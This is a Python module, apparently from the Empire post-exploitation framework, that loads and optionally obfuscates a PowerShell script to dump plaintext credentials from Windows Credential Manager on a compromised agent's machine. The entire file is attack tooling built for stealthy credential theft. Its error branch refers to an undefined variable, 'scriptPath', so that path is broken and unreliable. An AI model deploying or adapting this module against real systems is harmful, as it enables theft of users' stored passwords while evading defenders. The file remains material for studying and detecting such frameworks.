from lib.common import helpers

class Module:
    def __init__(self, mainMenu, params=[]):
        self.info = {
            'Name': 'enum_cred_store',
            'Author': ['BeetleChunks'],
            'Description': ('Dumps plaintext credentials from the Windows Credential Manager for the current interactive user.'),
            'Background' : True,
            'OutputExtension' : None,
            'NeedsAdmin' : False,
            'OpsecSafe' : True,
            'Language' : 'powershell',
            'MinLanguageVersion' : '2',
            'Comments': ['The powershell used is based on JimmyJoeBob Alooba\'s CredMan script.\nhttps://gallery.technet.microsoft.com/scriptcenter/PowerShell-Credentials-d44c3cde']
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):
        moduleSource = self.mainMenu.installPath + "/data/module_source/credentials/dumpCredStore.ps1"
        scriptCmd = "Invoke-X"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Unable to open script at the configured path: " + str(scriptPath))
            return ""

        script = f.read()
        f.close()

        scriptEnd = "\n%s" %(scriptCmd)
        if obfuscate:
            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        return script
